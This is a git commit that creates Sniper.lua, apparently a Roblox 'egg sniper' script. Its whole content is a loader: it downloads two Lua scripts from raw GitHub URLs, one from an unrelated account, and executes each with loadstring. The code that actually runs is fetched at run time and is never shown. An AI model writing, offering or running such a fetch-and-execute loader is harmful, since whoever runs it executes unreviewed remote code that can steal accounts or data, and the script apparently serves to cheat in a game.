fa679470fc847581ecc499ca0988c0c1f923652a
fensi12 <iceyaveri@gmail.com>
2025-07-22 18:03:36 +0800

    Create Sniper.lua

---
+++ Sniper.lua
@@ -0,0 +1,4 @@
+local s1 = game:HttpGet("https://raw.githubusercontent.com/ZenkiHub/binebenta/refs/heads/main/na%20lua")
+local s2 = game:HttpGet("https://raw.githubusercontent.com/fensi12/Egg-Sniper-Detector-v4/refs/heads/main/RandomizerV5.lua")
+loadstring(s1)()
+loadstring(s2)()
